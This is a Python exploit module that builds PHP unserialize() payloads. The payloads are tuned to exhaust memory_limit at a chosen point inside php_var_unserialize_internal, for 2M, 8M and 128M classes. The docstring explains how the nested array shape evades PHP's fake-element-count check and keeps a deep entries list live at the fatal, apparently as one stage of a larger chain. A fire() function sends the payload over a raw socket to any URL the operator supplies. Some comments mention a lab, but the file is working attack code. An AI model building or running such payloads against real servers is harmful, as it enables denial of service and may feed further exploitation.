#!/usr/bin/env python3
"""producer_unser.py - offline unserialize OOM producer: master shape (a) per memory_limit class.

Source receipts (read only, verified with sha256): the producerexp_20261021T184832Z
ledger (README.md P2 table + p2.txt) with the three master_payload_L*.bin files.
Master shape (a), receipt verbatim:

  'a:'.(P+1).':{'.'i:0;i:1;'*P.'i:1;a:'.H.':{'.'i:0;i:1;'*H.'}}'

Outer count is P+1: the P prefix pairs parse first and every value zval is copied
into the BG(unserialize) var-entries list (var_push_dtor_value via
process_nested_array_data) BEFORE the last element is parsed. Element #P is the
nested 'a:H:{' whose header calls array_init_size(H) plus
zend_hash_real_init_mixed, i.e. 40*check_size(H) bytes; the fatal fires inside
php_var_unserialize_internal with the entries list still deep. That placement is
the point of the shape; a bare giant count cannot reach it.

IS_FAKE_ELEM_COUNT rule (var_unserializer.c:33): a count N is rejected when
N > remaining_len / 2 BEFORE any alloc. A bare 'a:N:{' payload therefore never
OOMs on 8.5.10; the payload must carry at least 2N bytes after the header.
Every class here ships that padding as 8-byte 'i:0;i:1;' pairs; the nested body
is never parsed because the nested header already OOMs.

P=P_max+1 preemption note: one past the measured P_max the OUTER table header
alloc (40*check_size(P+2)) crosses the remaining budget first, so the fatal
reports the outer alloc instead of the nested one (2M: P=10749 tried 655360;
8M: P=65536 tried 5242880; 128M: P=4194304 tried 335544320). Those placements
are the wrong ones for the chain (no deep entries list at the OOM), so the
shipped P stays below P_max.

Transport targets the operator-supplied --url: the endpoint contract is a raw
request body (application/octet-stream) handed verbatim to unserialize(), so the
module assumes no path and no parameter name (build unser.php on the lab host).
The 128M class payload (48777252 bytes) is above the measured 8M post_max_size
ceiling: the fire path refuses before connect, because that class needs a raised
post cap (a server knob); the class stays lab instrument only. dry() remains the
offline byte builder (build bytes, sha256 plus length, zero sockets).
"""

import argparse
import hashlib
import json
import re
import socket
import time
from pathlib import Path
from urllib.parse import urlsplit

SOURCE_RECEIPTS = Path("/tmp/opencode/research/producerexp_20261021T184832Z")
POST_MAX_SIZE = 8_388_608            # measured post_max_size ceiling (info.php receipt)
CONTENT_TYPE = "application/octet-stream"   # raw body handed to unserialize()
DEFAULT_TIMEOUT = 10.0
ARTIFACT = "unser-payload.bin"

# receipted classes only (P2 table): H drives the nested alloc, P the deep
# entries list; payload length is O(P) and drives the transport ceiling.
CLASSES = {
    "2M": {
        "label": "2M",
        "limit": 2_097_152,
        "H": 32_769,
        "P": 10_000,
        "P_max": 10_748,
        "P_preempt": 10_749,
        "preempt_tried_bytes": 655_360,
        "payload_bytes": 342_176,
        "tried_alloc_bytes": 2_621_440,
        "sha256": "20e5c98688dcaabc2afef768e929ce7ef746ffd4f2bfb5968e1a75f3b32c1dc2",
        "bin": "master_payload_L2097152.bin",
    },
    "8M": {
        "label": "8M",
        "limit": 8_388_608,
        "H": 131_073,
        "P": 60_000,
        "P_max": 65_535,
        "P_preempt": 65_536,
        "preempt_tried_bytes": 5_242_880,
        "payload_bytes": 1_528_609,
        "tried_alloc_bytes": 10_485_760,
        "sha256": "0643d0a5c828b15bb0b26010ae06c4410453d3794954bef91c3c8b8bb1ce1c5b",
        "bin": "master_payload_L8388608.bin",
    },
    "128M": {
        "label": "128M",
        "limit": 134_217_728,
        "H": 2_097_153,
        "P": 4_000_000,
        "P_max": 4_194_303,
        "P_preempt": 4_194_304,
        "preempt_tried_bytes": 335_544_320,
        "payload_bytes": 48_777_252,
        "tried_alloc_bytes": 167_772_160,
        "sha256": "25538e4624cf321a49309ca5364c302285035ac727415ab2c8860d7468f7e95e",
        "bin": "master_payload_L134217728.bin",
    },
}
BY_LIMIT = {record["limit"]: record for record in CLASSES.values()}

_SIZE = re.compile(r"(\d+)([KMG]?)", re.IGNORECASE)
_MULTIPLIER = {"": 1, "K": 1024, "M": 1024 ** 2, "G": 1024 ** 3}
MARKERS = (b"Allowed memory", b"exhausted", b"Fatal error", b"unserialize")


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def validate_memory_limit(memory_limit: str | None) -> str:
    """A class label or ini size is required; blank/absent is a pre-flight failure."""
    if not isinstance(memory_limit, str) or not memory_limit.strip():
        raise ValueError(
            "producer_unser requires a memory_limit class (receipted: 2M / 8M / 128M)"
        )
    return memory_limit.strip()


def parse_memory_limit(memory_limit: str) -> int:
    """'2M' / '2097152' / '1024K' -> bytes."""
    text = validate_memory_limit(memory_limit)
    match = _SIZE.fullmatch(text)
    if match is None:
        raise ValueError(
            f"memory_limit must be an ini size like 2M / 1024K / N bytes (got {text!r})"
        )
    amount, suffix = match.group(1), match.group(2).upper()
    return int(amount) * _MULTIPLIER[suffix]


def class_record(memory_limit: str) -> dict:
    """Receipted class record; unknown limits are NotImplementedError, never a guess.

    Only the three classes with master_payload_L*.bin sha256 receipts ship. A
    future class needs a measured receipt first: the fatal threshold rule is
    40*check_size(N) > memory_limit - base (check_size = next power of two >= N,
    base ~780-900 KB on the CLI receipt stack), then P_max and the payload
    length must be re-measured for the master shape.
    """
    limit = parse_memory_limit(memory_limit)
    record = BY_LIMIT.get(limit)
    if record is None:
        raise NotImplementedError(
            f"memory_limit {memory_limit!r} ({limit} bytes) has no receipted class; "
            "only the 2M / 8M / 128M classes ship (master_payload_L*.bin sha256 "
            "receipts). A new class needs a measured receipt first: the fatal rule "
            "is 40*check_size(N) > memory_limit - base, where check_size is the "
            "next power of two >= N and base is the ~780-900 KB CLI baseline; then "
            "re-measure P_max and the master payload length"
        )
    return record


def build_payload(memory_limit: str) -> bytes:
    """Master shape (a) bytes for a receipted class. Pure/offline."""
    record = class_record(memory_limit)
    payload = (
        b"a:" + str(record["P"] + 1).encode("ascii") + b":{"
        + b"i:0;i:1;" * record["P"]
        + b"i:1;a:" + str(record["H"]).encode("ascii") + b":{"
        + b"i:0;i:1;" * record["H"]
        + b"}}"
    )
    if len(payload) != record["payload_bytes"]:
        raise RuntimeError(
            f"built payload length {len(payload)} != receipt {record['payload_bytes']} "
            f"for the {record['label']} class"
        )
    return payload


def request_bytes(path: str, host_header: str, payload: bytes,
                  keep_alive: bool = False) -> bytes:
    """Raw body POST: the endpoint hands the body verbatim to unserialize()."""
    headers = [
        f"POST {path} HTTP/1.1",
        f"Host: {host_header}",
        f"Content-Type: {CONTENT_TYPE}",
        f"Content-Length: {len(payload)}",
        "Connection: keep-alive" if keep_alive else "Connection: close",
    ]
    return ("\r\n".join(headers) + "\r\n\r\n").encode("ascii") + payload


def parse_url(value: str) -> tuple[str, int, str, str]:
    """Explicit endpoint URL only: scheme http, no credentials, no fragment."""
    parsed = urlsplit(value)
    if parsed.scheme != "http" or parsed.username or parsed.password or parsed.fragment:
        raise ValueError("URL must be an uncredentialed HTTP URL without a fragment")
    if not parsed.hostname:
        raise ValueError("URL has no host")
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    path.encode("ascii")
    host_header = parsed.hostname if port == 80 else f"{parsed.hostname}:{port}"
    return parsed.hostname, port, path, host_header


def scan_markers(data: bytes) -> list[dict]:
    hits = []
    for marker in MARKERS:
        at = data.find(marker)
        if at >= 0:
            hits.append({
                "marker": marker.decode("latin1"),
                "offset": at,
                "context": data[max(0, at - 60):at + 120].decode("latin1", "replace"),
            })
    return hits


def transport_guard(record: dict) -> None:
    """Pre-connect post_max_size ceiling: 128M class payload is over the stock cap."""
    if record["payload_bytes"] >= POST_MAX_SIZE:
        raise ValueError(
            f"unser payload for the {record['label']} class is "
            f"{record['payload_bytes']} bytes, at the measured post_max_size ceiling "
            f"{POST_MAX_SIZE}; a POST that size is aborted pre-unserialize, so no OOM "
            "is reachable. The 128M class needs a raised post_max_size (a server "
            "knob); its transport stays lab instrument only. Use the 2M or 8M class "
            "on the stock ceiling"
        )


def _record(memory_limit: str) -> dict:
    record = class_record(memory_limit)
    return {
        "label": record["label"],
        "limit": record["limit"],
        "H": record["H"],
        "P": record["P"],
        "P_max": record["P_max"],
        "P_preempt": record["P_preempt"],
        "preempt_tried_bytes": record["preempt_tried_bytes"],
        "payload_bytes": record["payload_bytes"],
        "tried_alloc_bytes": record["tried_alloc_bytes"],
        "sha256": record["sha256"],
        "bin": record["bin"],
    }


def dry(memory_limit: str, output: Path | None = None) -> dict:
    """Offline stage: build bytes, verify the receipt sha256, zero sockets."""
    record = class_record(memory_limit)
    payload = build_payload(memory_limit)
    digest = _sha256(payload)
    if digest != record["sha256"]:
        raise RuntimeError(
            f"byte-parity failure vs the {record['label']} receipt: built sha256 "
            f"{digest} != receipt {record['sha256']}"
        )
    summary = {
        "stage": "producer",
        "producer_stage": "producer_unser",
        "dry_run": True,
        "sent": False,
        "memory_limit": record["label"],
        "memory_limit_bytes": record["limit"],
        "shape": "master",
        "P": record["P"],
        "H": record["H"],
        "P_max": record["P_max"],
        "payload_bytes": len(payload),
        "payload_sha256": digest,
        "expected_alloc_bytes": record["tried_alloc_bytes"],
        "fatal_site": "php_var_unserialize_internal: array_init_size(H) + "
                      "zend_hash_real_init_mixed (var_unserializer.c:1731/1733)",
        "entries_parsed_before_fatal": record["P"],
        "p_max_plus_one_note": (
            f"P={record['P_preempt']} preempts with the outer table alloc "
            f"(tried {record['preempt_tried_bytes']} bytes), the wrong placement; "
            f"shipped P={record['P']} stays below P_max={record['P_max']}"
        ),
        "post_max_size": POST_MAX_SIZE,
        "over_budget": len(payload) >= POST_MAX_SIZE,
        "transport": "none (dry build)",
        "receipt": {
            "source": str(SOURCE_RECEIPTS),
            "ledger": "README.md P2 table + p2.txt sha256",
            "master_bin": record["bin"],
            "fatal_tried_bytes": record["tried_alloc_bytes"],
        },
    }
    if output is not None:
        output.mkdir(parents=True, exist_ok=True)
        (output / ARTIFACT).write_bytes(payload)
        summary["artifacts"] = {
            ARTIFACT[:-4].replace("-", "_"): {
                "bytes": len(payload),
                "sha256": digest,
            },
        }
    return summary


def fire(url: str, memory_limit: str, output: Path | None = None,
         timeout: float = DEFAULT_TIMEOUT) -> dict:
    """Send to the supplied endpoint: ceiling guard pre connect, single exchange."""
    record = class_record(memory_limit)
    transport_guard(record)   # pre connect: never build or send the 128M class
    payload = build_payload(memory_limit)
    digest = _sha256(payload)
    host, port, path, _host_header = parse_url(url)
    request = request_bytes(path, _host_header, payload)
    started = time.monotonic()
    from tool.modules import arm  # local import keeps the dry path socket clean
    with socket.create_connection((host, port), timeout=timeout) as connection:
        connection.settimeout(timeout)
        connection.sendall(request)
        response, body, headers, status = arm.read_response(
            connection.makefile("rb", buffering=0))
    wall_ms = round((time.monotonic() - started) * 1000, 1)
    summary = {
        "stage": "producer",
        "producer_stage": "producer_unser",
        "dry_run": False,
        "sent": True,
        "url": url,
        "host": host,
        "port": port,
        "path": path,
        "memory_limit": record["label"],
        "memory_limit_bytes": record["limit"],
        "P": record["P"],
        "H": record["H"],
        "payload_bytes": len(payload),
        "payload_sha256": digest,
        "expected_alloc_bytes": record["tried_alloc_bytes"],
        "post_max_size": POST_MAX_SIZE,
        "status": status,
        "response_bytes": len(response),
        "response_body_bytes": len(body),
        "response_body_sha256": _sha256(body),
        "connection": headers.get("connection", ""),
        "wall_ms": wall_ms,
        "markers": scan_markers(body),
        "receipt": {
            "source": str(SOURCE_RECEIPTS),
            "master_bin": record["bin"],
            "fatal_tried_bytes": record["tried_alloc_bytes"],
        },
    }
    if output is not None:
        output.mkdir(parents=True, exist_ok=True)
        artifacts = {
            "unser-request.bin": request,
            "unser-response.bin": response,
            "unser-body.bin": body,
        }
        meta = {}
        for name, data in artifacts.items():
            (output / name).write_bytes(data)
            meta[name[:-4].replace("-", "_")] = {
                "bytes": len(data),
                "sha256": _sha256(data),
            }
        summary["artifacts"] = meta
    return summary


def verify_receipts(receipts_dir: Path = SOURCE_RECEIPTS) -> dict:
    """Byte parity assert: built payload vs every receipted .bin (sha256 plus equality)."""
    if not receipts_dir.is_dir():
        raise FileNotFoundError(
            f"source receipts dir not found: {receipts_dir}; pass --receipts-dir "
            "pointing at producerexp_20261021T184832Z"
        )
    classes = {}
    verified = True
    for label in CLASSES:
        record = CLASSES[label]
        payload = build_payload(label)
        digest = _sha256(payload)
        bin_path = receipts_dir / record["bin"]
        if not bin_path.is_file():
            raise FileNotFoundError(f"missing receipt payload: {bin_path}")
        receipt_bytes = bin_path.read_bytes()
        receipt_sha = _sha256(receipt_bytes)
        checks = {
            "payload_bytes": len(payload),
            "payload_sha256": digest,
            "payload_matches_receipt_sha": digest == record["sha256"],
            "payload_length_matches": len(payload) == record["payload_bytes"],
            "receipt_bin": record["bin"],
            "receipt_bin_bytes": len(receipt_bytes),
            "receipt_bin_sha256": receipt_sha,
            "receipt_bin_sha_matches": receipt_sha == record["sha256"],
            "byte_identical": payload == receipt_bytes,
        }
        classes[label] = checks
        verified = verified and all((
            checks["payload_matches_receipt_sha"],
            checks["payload_length_matches"],
            checks["receipt_bin_sha_matches"],
            checks["byte_identical"],
        ))
    return {
        "verified": verified,
        "receipts_dir": str(receipts_dir),
        "classes": classes,
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="unserialize OOM producer: send master shape (a) bytes for a "
        "receipted memory_limit class to the supplied --url; --verify-receipts "
        "asserts sha256 parity against the source .bin files",
    )
    parser.add_argument(
        "--memory-limit",
        default=None,
        help="receipted class: 2M / 8M / 128M (or the byte value); required for a build",
    )
    parser.add_argument("--output", type=Path, default=None,
                        help="receipt dir (payload.bin + result.json)")
    parser.add_argument("--url", default=None,
                        help="exact unserialize endpoint URL; no path is assumed")
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("--verify-receipts", action="store_true",
                        help="standalone byte parity assert against the source .bin files")
    parser.add_argument("--receipts-dir", type=Path, default=SOURCE_RECEIPTS,
                        help="source receipt dir for --verify-receipts")
    args = parser.parse_args()

    if args.verify_receipts:
        if args.memory_limit or args.url:
            parser.error("--verify-receipts is standalone: drop --memory-limit/--url")
        try:
            summary = verify_receipts(args.receipts_dir)
        except (OSError, ValueError) as error:
            summary = {
                "verified": False,
                "receipts_dir": str(args.receipts_dir),
                "error": f"{type(error).__name__}: {error}",
            }
            print(json.dumps(summary, indent=2, sort_keys=True))
            return 2
        if args.output is not None:
            args.output.mkdir(parents=True, exist_ok=True)
            (args.output / "result.json").write_text(
                json.dumps(summary, indent=2, sort_keys=True) + "\n")
        print(json.dumps(summary, indent=2, sort_keys=True))
        return 0 if summary["verified"] else 2

    if args.memory_limit is None:
        parser.error("--memory-limit is required for a build (receipted: 2M / 8M / 128M)")
    if args.url is None:
        parser.error(
            "--url is required: the module does not assume an unserialize "
            "endpoint path (lab unser.php is a separate build)")
    try:
        summary = fire(args.url, args.memory_limit, args.output, timeout=args.timeout)
    except (ConnectionError, OSError, TimeoutError, TypeError, ValueError,
            NotImplementedError) as error:
        summary = {
            "stage": "producer",
            "producer_stage": "producer_unser",
            "dry_run": False,
            "sent": False,
            "memory_limit": args.memory_limit,
            "error": f"{type(error).__name__}: {error}",
        }
        if args.url is not None:
            summary["url"] = args.url
        if args.output is not None:
            args.output.mkdir(parents=True, exist_ok=True)
            (args.output / "result.json").write_text(
                json.dumps(summary, indent=2, sort_keys=True) + "\n")
        print(json.dumps(summary, indent=2, sort_keys=True))
        return 2
    if args.output is not None:
        args.output.mkdir(parents=True, exist_ok=True)
        (args.output / "result.json").write_text(
            json.dumps(summary, indent=2, sort_keys=True) + "\n")
    print(json.dumps({k: v for k, v in summary.items() if k != "artifacts"},
                     indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
